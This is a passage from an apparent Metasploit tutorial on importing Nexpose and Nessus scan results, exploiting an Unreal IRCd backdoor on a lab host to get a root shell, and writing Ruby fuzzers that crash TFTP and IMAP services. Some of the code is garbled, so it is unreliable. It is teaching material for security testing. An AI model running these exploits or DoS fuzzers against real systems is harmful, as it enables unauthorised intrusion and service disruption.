 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-default-account-root-nopassword refs=CVE-2002-1809,BID-5503,NEXPOSE-mysql-default-account-root-nopassword info=mysql-default-account-root-nopassword
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-yassl-certdecodergetname-multiple-bofs refs=CVE-2009-4484,BID-37640,BID-37943,BID-37974,OSVDB-61956,SECUNIA-37493,SECUNIA-38344,SECUNIA-38364,SECUNIA-38517,SECUNIA-38573,URL-http://bugs.mysql.com/bug.php?id=50227,URL-http://dev.mysql.com/doc/refman/5.0/en/news-5-0-90.html,URL-http://dev.mysql.com/doc/refman/5.1/en/news-5-1-43.html,NEXPOSE-mysql-yassl-certdecodergetname-multiple-bofs info=mysql-yassl-certdecodergetname-multiple-bofs
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-yassl-multiple-bof refs=CVE-2008-0226,CVE-2008-0227,BID-27140,BID-31681,SECUNIA-28324,SECUNIA-28419,SECUNIA-28597,SECUNIA-29443,SECUNIA-32222,URL-http://bugs.mysql.com/bug.php?id=33814,NEXPOSE-mysql-yassl-multiple-bof info=mysql-yassl-multiple-bof
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-directory-traversal-and-arbitrary-table-access refs=CVE-2010-1848,URL-http://bugs.mysql.com/bug.php?id=53371,URL-http://dev.mysql.com/doc/refman/5.0/en/news-5-0-91.html,URL-http://dev.mysql.com/doc/refman/5.1/en/news-5-1-47.html,NEXPOSE-mysql-directory-traversal-and-arbitrary-table-access info=mysql-directory-traversal-and-arbitrary-table-access
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-vio_verify_callback-zero-depth-x-509-certificate refs=CVE-2009-4028,URL-http://bugs.mysql.com/bug.php?id=47320,URL-http://dev.mysql.com/doc/refman/5.0/en/news-5-0-88.html,URL-http://dev.mysql.com/doc/refman/5.1/en/news-5-1-41.html,NEXPOSE-mysql-vio_verify_callback-zero-depth-x-509-certificate info=mysql-vio_verify_callback-zero-depth-x-509-certificate
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-bug-29801-remote-federated-engine-crash refs=URL-http://bugs.mysql.com/bug.php?id=29801,NEXPOSE-mysql-bug-29801-remote-federated-engine-crash info=mysql-bug-29801-remote-federated-engine-crash
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-bug-38296-nested-boolean-query-exhaustion-dos refs=URL-http://bugs.mysql.com/bug.php?id=38296,NEXPOSE-mysql-bug-38296-nested-boolean-query-exhaustion-dos info=mysql-bug-38296-nested-boolean-query-exhaustion-dos
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-com_field_list-command-bof refs=CVE-2010-1850,URL-http://bugs.mysql.com/bug.php?id=53237,URL-http://dev.mysql.com/doc/refman/5.0/en/news-5-0-91.html,URL-http://dev.mysql.com/doc/refman/5.1/en/news-5-1-47.html,NEXPOSE-mysql-com_field_list-command-bof info=mysql-com_field_list-command-bof
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-datadir-isam-table-privilege-escalation refs=CVE-2008-2079,BID-29106,BID-31681,SECUNIA-30134,SECUNIA-31066,SECUNIA-31226,SECUNIA-31687,SECUNIA-32222,SECUNIA-36701,URL-http://bugs.mysql.com/32091,URL-http://dev.mysql.com/doc/refman/5.1/en/news-5-1-23.html,URL-http://dev.mysql.com/doc/refman/6.0/en/news-6-0-4.html,NEXPOSE-mysql-datadir-isam-table-privilege-escalation info=mysql-datadir-isam-table-privilege-escalation
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-my_net_skip_rest-packet-length-dos refs=CVE-2010-1849,URL-http://bugs.mysql.com/bug.php?id=50974,URL-http://bugs.mysql.com/bug.php?id=53371,URL-http://dev.mysql.com/doc/refman/5.1/en/news-5-1-47.html,NEXPOSE-mysql-my_net_skip_rest-packet-length-dos info=mysql-my_net_skip_rest-packet-length-dos
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-myisam-table-privilege-check-bypass refs=CVE-2008-4097,CVE-2008-4098,SECUNIA-32759,SECUNIA-38517,URL-http://bugs.mysql.com/bug.php?id=32167,URL-http://lists.mysql.com/commits/50036,URL-http://lists.mysql.com/commits/50773,NEXPOSE-mysql-myisam-table-privilege-check-bypass info=mysql-myisam-table-privilege-check-bypass
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-bug-29908-alter-view-priv-esc refs=URL-http://bugs.mysql.com/bug.php?id=29908,NEXPOSE-mysql-bug-29908-alter-view-priv-esc info=mysql-bug-29908-alter-view-priv-esc
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-bug-44798-stored-procedures-server-crash refs=URL-http://bugs.mysql.com/bug.php?id=44798,NEXPOSE-mysql-bug-44798-stored-procedures-server-crash info=mysql-bug-44798-stored-procedures-server-crash
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-empty-bit-string-dos refs=CVE-2008-3963,SECUNIA-31769,SECUNIA-32759,SECUNIA-34907,URL-http://bugs.mysql.com/bug.php?id=35658,NEXPOSE-mysql-empty-bit-string-dos info=mysql-empty-bit-string-dos
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-innodb-dos refs=CVE-2007-5925,BID-26353,SECUNIA-27568,SECUNIA-27649,SECUNIA-27823,SECUNIA-28025,SECUNIA-28040,SECUNIA-28099,SECUNIA-28108,SECUNIA-28128,SECUNIA-28838,URL-http://bugs.mysql.com/bug.php?id=32125,NEXPOSE-mysql-innodb-dos info=mysql-innodb-dos
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-html-output-script-insertion refs=CVE-2008-4456,BID-31486,SECUNIA-32072,SECUNIA-34907,SECUNIA-38517,URL-http://bugs.mysql.com/bug.php?id=27884,URL-http://www.henlich.de/it-security/mysql-command-line-client-html-injection-vulnerability,NEXPOSE-mysql-html-output-script-insertion info=mysql-html-output-script-insertion
 [*] Time: 2012-06-20 02:09:50 UTC Vuln: host=172.16.194.172 name=NEXPOSE-database-open-access refs=URL-https://www.pcisecuritystandards.org/security_standards/download.html?id=pci_dss_v1-2.pdf,NEXPOSE-database-open-access info=database-open-access


Working with Nessus
==================

Nessus is a well-known and popular vulnerability scanner that is free for personal, non-commercial use that was first released in 1998 by Renaurd Deraison and currently published by Tenable Network Security. There is also a spin-off project of Nessus 2, named OpenVAS, that is published under the GPL. Using a large number of vulnerability checks, called plugins in Nessus, you can identify a large number of well-known vulnerabilities. Metasploit will accept vulnerability scan result files from both Nessus and OpenVAS in the nbe file format.

Let’s walk through the process. First we complete a scan from Nessus:

Upon completion of a vulnerability scan, we save our results in the nbe format and then start msfconsole. Next, we need to import the results into the Metasploit Framework. Let’s look at the help command.

::

  msf > help

 ...snip...

 Database Backend Commands
 =========================
    Command        Description
    -------        -----------
    creds          List all credentials in the database
    db_connect     Connect to an existing database
    db_disconnect  Disconnect from the current database instance
    db_export      Export a file containing the contents of the database
    db_import      Import a scan result file (filetype will be auto-detected)
    db_nmap        Executes nmap and records the output automatically
    db_status      Show the current database status
    hosts          List all hosts in the database
    loot           List all loot in the database
    notes          List all notes in the database
    services       List all services in the database
    vulns          List all vulnerabilities in the database
    workspace      Switch between database workspaces

 msf >


Let’s go ahead and import the nbe results file by issuing the db_import command followed by the path to our results file.


::

  msf > db_import /root/Nessus/nessus_scan.nbe
 [*] Importing 'Nessus NBE Report' data
 [*] Importing host 172.16.194.254
 [*] Importing host 172.16.194.254
 [*] Importing host 172.16.194.254
 [*] Importing host 172.16.194.2
 [*] Importing host 172.16.194.2
 [*] Importing host 172.16.194.2
 ...snip...
 [*] Importing host 172.16.194.1
 [*] Importing host 172.16.194.1
 [*] Importing host 172.16.194.1
 [*] Importing host 172.16.194.1
 [*] Importing host 172.16.194.1
 [*] Successfully imported /root/Nessus/nessus_scan.nbe
 msf >


After importing the results file, we can execute the hosts command to list the hosts that are in the nbe results file.

::

  msf > hosts

 Hosts
 =====

 address         mac  name    os_name                                                                             os_flavor  os_sp  purpose  info  comments
 -------         ---  ----    -------                                                                             ---------  -----  -------  ----  --------
 172.16.194.1                 one of these operating systems : \nMac OS X 10.5\nMac OS X 10.6\nMac OS X 10.7\n                      device
 172.16.194.2                 Unknown                                                                                               device
 172.16.194.134               Microsoft Windows                                                                   XP         SP2    client
 172.16.194.148               Linux Kernel 2.6 on Ubuntu 8.04 (hardy)\n                                                             device
 172.16.194.163               Linux Kernel 3.2.6 on Ubuntu 10.04\n                                                                  device
 172.16.194.165       phpcgi  Linux phpcgi 2.6.32-38-generic-pae #83-Ubuntu SMP Wed Jan 4 12:11:13 UTC 2012 i686                    device
 172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 (hardy)\n                                                             device

 msf >

We see exactly what we were expecting. Next we execute the services command, which will enumerate all of the services that were detected running on the scanned system.

::

  msf > services 172.16.194.172

 Services
 ========

 host            port   proto  name            state  info
 ----            ----   -----  ----            -----  ----
 172.16.194.172  21     tcp    ftp             open
 172.16.194.172  22     tcp    ssh             open
 172.16.194.172  23     tcp    telnet          open
 172.16.194.172  25     tcp    smtp            open
 172.16.194.172  53     udp    dns             open
 172.16.194.172  53     tcp    dns             open
 172.16.194.172  69     udp    tftp            open
 172.16.194.172  80     tcp    www             open
 172.16.194.172  111    tcp    rpc-portmapper  open
 172.16.194.172  111    udp    rpc-portmapper  open
 172.16.194.172  137    udp    netbios-ns      open
 172.16.194.172  139    tcp    smb             open
 172.16.194.172  445    tcp    cifs            open
 172.16.194.172  512    tcp    rexecd          open
 172.16.194.172  513    tcp    rlogin          open
 172.16.194.172  514    tcp    rsh             open
 172.16.194.172  1099   tcp    rmi_registry    open
 172.16.194.172  1524   tcp                    open
 172.16.194.172  2049   tcp    rpc-nfs         open
 172.16.194.172  2049   udp    rpc-nfs         open
 172.16.194.172  2121   tcp    ftp             open
 172.16.194.172  3306   tcp    mysql           open
 172.16.194.172  5432   tcp    postgresql      open
 172.16.194.172  5900   tcp    vnc             open
 172.16.194.172  6000   tcp    x11             open
 172.16.194.172  6667   tcp    irc             open
 172.16.194.172  8009   tcp    ajp13           open
 172.16.194.172  8787   tcp                    open
 172.16.194.172  45303  udp    rpc-status      open
 172.16.194.172  45765  tcp    rpc-mountd      open
 172.16.194.172  47161  tcp    rpc-nlockmgr    open
 172.16.194.172  50410  tcp    rpc-status      open
 172.16.194.172  52843  udp    rpc-nlockmgr    open
 172.16.194.172  55269  udp    rpc-mountd      open

Finally, and most importantly, the vulns command will list all of the vulnerabilities that were reported by Nessus and recorded in the results file. Issuing help vulns will provide us with this command’s many options. We will filter our search by port number to lighten the output of the command.

::

  msf > help vulns
 Print all vulnerabilities in the database

 Usage: vulns [addr range]

  -h,--help             Show this help information
  -p,--port >portspec>  List vulns matching this port spec
  -s >svc names>        List vulns matching these service names
  -S,--search           Search string to filter by
  -i,--info             Display Vuln Info

 Examples:
  vulns -p 1-65536          # only vulns with associated services
  vulns -p 1-65536 -s http  # identified as http on any port

 msf >

::

  msf > vulns -p 139
 [*] Time: 2012-06-15 18:32:26 UTC Vuln: host=172.16.194.134 name=NSS-11011 refs=NSS-11011
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11011 refs=NSS-11011

 msf > vulns -p 22
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10267 refs=NSS-10267
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-22964 refs=NSS-22964
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10881 refs=NSS-10881
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-39520 refs=NSS-39520
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-39520 refs=NSS-39520
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-25221 refs=NSS-25221
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10881 refs=NSS-10881
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10267 refs=NSS-10267
 [*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-22964 refs=NSS-22964
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-39520 refs=NSS-39520
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10881 refs=NSS-10881
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-32314 refs=CVE-2008-0166,BID-29179,OSVDB-45029,CWE-310,NSS-32314
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10267 refs=NSS-10267
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-22964 refs=NSS-22964

 msf > vulns 172.16.194.172 -p 6667
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-46882 refs=CVE-2010-2075,BID-40820,OSVDB-65445,NSS-46882
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11156 refs=NSS-11156
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-17975 refs=NSS-17975
 msf >


Let’s pick the CVE associated with port 6667 found by Nessus and see if Metasploit has anything on that. We’ll issue the search command from msfconsole followed by the CVE number.

::

  msf > search cve:2010-2075

 Matching Modules
 ================

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution


 msf >

We see Metasploit has a working module for this vulnerability. The next step is to use the module, set the appropriate options, and execute the exploit.


::

  msf  exploit(unreal_ircd_3281_backdoor) > exploit

 [*] Started reverse double handler
 [*] Connected to 172.16.194.172:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
 [*] Sending backdoor command...
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo Q4SefN7pIVSQUL2F;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: "Q4SefN7pIVSQUL2F\r\n"
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:35941) at 2012-06-15 15:08:51 -0400

 ifconfig
 eth0      Link encap:Ethernet  HWaddr 00:0c:29:d1:62:80
          inet addr:172.16.194.172  Bcast:172.16.194.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fed1:6280/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:290453 errors:0 dropped:0 overruns:0 frame:0
          TX packets:402340 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:41602322 (39.6 MB)  TX bytes:344600671 (328.6 MB)
          Interrupt:19 Base address:0x2000

 lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:774 errors:0 dropped:0 overruns:0 frame:0
          TX packets:774 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:343253 (335.2 KB)  TX bytes:343253 (335.2 KB)

 id
 uid=0(root) gid=0(root)


As you can see, importing Nessus scan results into Metasploit is a powerful feature. This demonstrates the versatility of the Framework, and some of the possibilities for integration with 3rd party tools such as Nessus.


Nessus via MSFconsole
^^^^^^^^^^^^^^^^^^

For those situations where we choose to remain at the command line, there is also the option to connect to a Nessus version 4.4.x server directly from within msfconsole. The Nessus Bridge, written by Zate and covered in detail at http://blog.zate.org/2010/09/26/nessus-bridge-for-metasploit-intro/ uses xmlrpc to connect to a server instance of Nessus, allowing us to perform and import a vulnerability scan rather than doing a manual import.

We begin by first loading the Nessus Bridge Plugin.

::

  msf > load nessus
 [*] Nessus Bridge for Metasploit 1.1
 [+] Type nessus_help for a command listing
 [*] Successfully loaded plugin: nessus


Running ‘nessus_help‘ will display the msfconole commands now available to us. As you can see, it is quite full-featured.


::

  msf > nessus_help
 [+] Nessus Help
 [+] type nessus_help command for help with specific commands

 Command                    Help Text
 -------                    ---------
 Generic Commands
 -----------------          -----------------
 nessus_connect             Connect to a nessus server
 nessus_logout              Logout from the nessus server
 nessus_help                Listing of available nessus commands
 nessus_server_status       Check the status of your Nessus Server
 nessus_admin               Checks if user is an admin
 nessus_server_feed         Nessus Feed Type
 nessus_find_targets        Try to find vulnerable targets from a report

 Reports Commands
 -----------------          -----------------
 nessus_report_list         List all Nessus reports
 nessus_report_get          Import a report from the nessus server in Nessus v2 format
 nessus_report_hosts        Get list of hosts from a report
 nessus_report_host_ports   Get list of open ports from a host from a report
 nessus_report_host_detail  Detail from a report item on a host

 Scan Commands
 -----------------          -----------------
 nessus_scan_new            Create new Nessus Scan
 nessus_scan_status         List all currently running Nessus scans
 ...snip...


Prior to beginning, we need to connect to the Nessus server on our network. Note that we need to add ‘ok‘ at the end of the connection string to acknowledge the risk of man-in-the-middle attacks being possible.

::

  msf > nessus_connect dook:s3cr3t@192.168.1.100
 [-] Warning: SSL connections are not verified in this release, it is possible for an attacker
 [-]          with the ability to man-in-the-middle the Nessus traffic to capture the Nessus
 [-]          credentials. If you are running this on a trusted network, please pass in 'ok'
 [-]          as an additional parameter to this command.
 msf > nessus_connect dook:s3cr3t@192.168.1.100 ok
 [*] Connecting to https://192.168.1.100:8834/ as dook
 [*] Authenticated
 msf >

To see the scan policies that are available on the server, we issue the ‘nessus_policy_list‘ command. If there are not any policies available, this means that you will need to connect to the Nessus GUI and create one before being able to use it.


::

  msf > nessus_policy_list
 [+] Nessus Policy List

 ID  Name       Owner  visability
 --  ----       -----  ----------
 1   the_works  dook   private

 msf >


To run a Nessus scan using our existing policy, use the command ‘nessus_scan_new‘ followed by the policy ID number, a name for your scan, and the target.

::

  msf > nessus_scan_new
 [*] Usage:
 [*]        nessus_scan_new policy id scan name targets
 [*]        use nessus_policy_list to list all available policies
 msf > nessus_scan_new 1 pwnage 192.168.1.161
 [*] Creating scan from policy number 1, called "pwnage" and scanning 192.168.1.161
 [*] Scan started.  uid is 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 msf >


To see the progress of our scan, we run ‘nessus_scan_status‘. Note that there is no progress indicator so we keep running the command until we see the message ‘No Scans Running‘.


::

  msf > nessus_scan_status
 [+] Running Scans

 Scan ID                                               Name    Owner  Started            Status   Current Hosts  Total Hosts
 -------                                               ----    -----  -------            ------   -------------  -----------
 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f  pwnage  dook   19:39 Sep 27 2010  running  0              1


 [*] You can:
 [+]         Import Nessus report to database :     nessus_report_get reportid
 [+]         Pause a nessus scan :             nessus_scan_pause scanid
 msf > nessus_scan_status
 [*] No Scans Running.
 [*] You can:
 [*]         List of completed scans:         nessus_report_list
 [*]         Create a scan:                   nessus_scan_new policy id scan name target(s)
 msf >


When Nessus completes the scan, it generates a report for us with the results. To view the list of available reports, we run the ‘nessus_report_list‘ command. To import a report, we run ‘nessus_report_get‘ followed by the report ID.

::

  msf > nessus_report_list
 [+] Nessus Report List

 ID                                                    Name    Status     Date
 --                                                    ----    ------     ----
 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f  pwnage  completed  19:47 Sep 27 2010

 [*] You can:
 [*]         Get a list of hosts from the report:          nessus_report_hosts report id
 msf > nessus_report_get
 [*] Usage:
 [*]        nessus_report_get report id
 [*]        use nessus_report_list to list all available reports for importing
 msf > nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 [*] importing 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 msf >

With the report imported, we can list the hosts and vulnerabilities just as we could when importing a report manually.

::

  msf > hosts -c address,vulns

 Hosts
 =====

 address        vulns
 -------        -----
 192.168.1.161  33

 msf > vulns
 [*] Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=3389 proto=tcp name=NSS-10940 refs=
 [*] Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=1900 proto=udp name=NSS-35713 refs=
 [*] Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=1030 proto=tcp name=NSS-22319 refs=
 [*] Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-10396 refs=
 [*] Time: 2010-09-28 01:51:38 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-10860 refs=CVE-2000-1200,BID-959,OSVDB-714
 [*] Time: 2010-09-28 01:51:38 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-10859 refs=CVE-2000-1200,BID-959,OSVDB-715
 [*] Time: 2010-09-28 01:51:39 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-18502 refs=CVE-2005-1206,BID-13942,IAVA-2005-t-0019
 [*] Time: 2010-09-28 01:51:40 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-20928 refs=CVE-2006-0013,BID-16636,OSVDB-23134
 [*] Time: 2010-09-28 01:51:41 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-35362 refs=CVE-2008-4834,BID-31179,OSVDB-48153
 [*] Time: 2010-09-28 01:51:41 UTC Vuln: host=192.168.1.161
 ...snip...


You should now have an understanding of how to manually import Nessus scan results as well as use the Nessus Bridge plugin directly within the Metasploit Framework to scan for vulnerabilities.

***************
fuzzers
*************

Writing a Simple Fuzzer
========================

A Fuzzer is a tool used by security professionals to provide invalid and unexpected data to the inputs of a program. A typical Fuzzer tests an application for buffer overflow, invalid format strings, directory traversal attacks, command execution vulnerabilities, SQL Injection, XSS, and more.

Because the Metasploit Framework provides a very complete set of libraries to security professionals for many network protocols and data manipulations, it is a good candidate for quick development of a simple fuzzer.

Metasploit’s Rex Library
^^^^^^^^^^^^^^^^^^^^^^^^

The Rex::Text module provides lots of handy methods for dealing with text like:

* Buffer conversion
* Encoding (html, url, etc)
* Checksumming
* Random string generation

The last point is extremely helpful in writing a simple fuzzer. This will help you writing fuzzer tools such as a simple URL Fuzzer or full Network Fuzzer.

For more information about Rex, please refer to the Rex API documentation.

Here are some of the functions that you can find in Rex::Text :

::

  root@kali:~# grep "def self.rand" /usr/share/metasploit-framework/lib/rex/text.rb
 def self.rand_char(bad, chars = AllChars)
 def self.rand_base(len, bad, *foo)
 def self.rand_text(len, bad='', chars = AllChars)
 def self.rand_text_alpha(len, bad='')
 def self.rand_text_alpha_lower(len, bad='')
 def self.rand_text_alpha_upper(len, bad='')
 def self.rand_text_alphanumeric(len, bad='')
 def self.rand_text_numeric(len, bad='')
 def self.rand_text_english(len, bad='')
 def self.rand_text_highascii(len, bad='')
 def self.randomize_space(str)
 def self.rand_hostname
 def self.rand_state()

Simple TFTP Fuzzer
===================

One of the most powerful aspects of Metasploit is how easy it is to make changes and create new functionality by reusing existing code. For instance, as this very simple Fuzzer code demonstrates, you can make a few minor modifications to an existing Metasploit module to create a Fuzzer module. The changes will pass ever-increasing lengths to the transport mode value to the 3Com TFTP Service for Windows, resulting in an overwrite of EIP.

::

  #Metasploit

 require 'msf/core'

 class Metasploit3  '3Com TFTP Fuzzer',
                        'Version'        => '$Revision: 1 $',
                        'Description'    => '3Com TFTP Fuzzer Passes Overly Long Transport Mode String',
                        'Author'         => 'Your name here',
                        'License'        => MSF_LICENSE
                )
                register_options( [
                Opt::RPORT(69)
                ], self.class)
        end

        def run_host(ip)
                # Create an unbound UDP socket
                udp_sock = Rex::Socket::Udp.create(
                        'Context'   =>
                                {
                                        'Msf'        => framework,
                                        'MsfExploit' => self,
                                }
                )
                count = 10  # Set an initial count
                while count < 2000  # While the count is under 2000 run
                        evil = "A" * count  # Set a number of "A"s equal to count
                        pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00"  # Define the payload
                        udp_sock.sendto(pkt, ip, datastore['RPORT'])  # Send the packet
                        print_status("Sending: #{evil}")  # Status update
                        resp = udp_sock.get(1)  # Capture the response
                        count += 10  # Increase count by 10, and loop
                end
        end
 end

Testing our Fuzzer Tool
^^^^^^^^^^^^^^^^^^^^^^^^

Pretty straight forward. Lets run it and see what happens with OllyDbg

And we have a crash! Our new Fuzzer tool is working as expected. While this may seem simple on the surface, one thing to consider is the reusable code that this provides us. In our example, the payload structure was defined for us, saving us time, and allowing us to get directly to the fuzzing rather than researching the TFTP protocol. This is extremely powerful, and is a hidden benefit of the Metasploit Framework.

Simple IMAP Fuzzer
===================

Writing our own IMAP Fuzzer Tool
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

During a host reconnaissance session we discovered an IMAP Mail server which is known to be vulnerable to a buffer overflow attack (Surgemail 3.8k4-4). We found an advisory for the vulnerability but can’t find any working exploits in the Metasploit database nor on the internet. We then decide to write our own exploit starting with a simple IMAP fuzzer.

From the advisory we do know that the vulnerable command is IMAP LIST and you need valid credentials to exploit the application. As we’ve previously seen, the big “library arsenal” present in MSF can help us to quickly script any network protocol and the IMAP protocol is not an exception. Including Msf::Exploit::Remote::Imap will save us a lot of time. In fact, connecting to the IMAP server and performing the authentication steps required to fuzz the vulnerable command, is just a matter of a single line command line! Here is the code for the IMAP LIST fuzzer:

::

  ##
  # This file is part of the Metasploit Framework and may be subject to
  # redistribution and commercial restrictions. Please see the Metasploit
  # Framework web site for more information on licensing and terms of use.
  # http://metasploit.com/framework/
  ##


 require 'msf/core'


 class Metasploit3 > Msf::Auxiliary

    include Msf::Exploit::Remote::Imap
    include Msf::Auxiliary::Dos

    def initialize
        super(
            'Name'           => 'Simple IMAP Fuzzer',
            'Description'    => %q{
                                An example of how to build a simple IMAP fuzzer.
                                Account IMAP credentials are required in this fuzzer.
                        },
            'Author'         => [ 'ryujin' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 1 $'
        )
    end

    def fuzz_str()
        return Rex::Text.rand_text_alphanumeric(rand(1024))
    end

    def run()
        srand(0)
        while (true)
            connected = connect_login()
            if not connected
                print_status("Host is not responding - this is G00D ;)")
                break
            end
            print_status("Generating fuzzed data...")
            fuzzed = fuzz_str()
            print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
            req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
            print_status(req)
            res = raw_send_recv(req)
                if !res.nil?
            print_status(res)
                else
                    print_status("Server crashed, no response")
                    break
                end
            disconnect()
        end
    end
 end

Overiding the run() method, our code will be executed each time the user calls “run” from msfconsole. In the while loop within run(), we connect to the IMAP server and authenticate through the function connect_login() imported from Msf::Exploit::Remote::Imap. We then call the function fuzz_str() which generates a variable size alphanumeric buffer that is going to be sent as an argument of the LIST IMAP command through the raw_send_recv function. We save the above file in the auxiliary/dos/windows/imap/ subdirectory and load it from msfconsole as it follows:

::

  msf > use auxiliary/dos/windows/imap/fuzz_imap
 msf auxiliary(fuzz_imap) > show options

 Module options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   IMAPPASS                   no        The password for the specified username
   IMAPUSER                   no        The username to authenticate as
   RHOST                      yes       The target address
   RPORT     143              yes       The target port

 msf auxiliary(fuzz_imap) > set RHOST 172.16.30.7
 RHOST => 172.16.30.7
 msf auxiliary(fuzz_imap) > set IMAPUSER test
 IMAPUSER => test
 msf auxiliary(fuzz_imap) > set IMAPPASS test
 IMAPPASS => test


Testing our IMAP Fuzzer Tool
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

We are now ready to fuzz the vulnerable IMAP server. We attach the surgemail.exe process from ImmunityDebugger and start our fuzzing session:

::

  msf auxiliary(fuzz_imap) > run

 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Generating fuzzed data...
 [*] Sending fuzzed data, buffer length = 684
 [*] 0002 LIST () /"v1AD7DnJTVykXGYYM6BmnXL[...]" "PWNED"

 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Generating fuzzed data...
 [*] Sending fuzzed data, buffer length = 225
 [*] 0002 LIST () /"lLdnxGBPh1AWt57pCvAZfiL[...]" "PWNED"

 [*] 0002 OK LIST completed

 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Generating fuzzed data...
 [*] Sending fuzzed data, buffer length = 1007
 [*] 0002 LIST () /"FzwJjIcL16vW4PXDPpJV[...]gaDm" "PWNED"

 [*]
 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Authentication failed
 [*] Host is not responding - this is G00D ;)
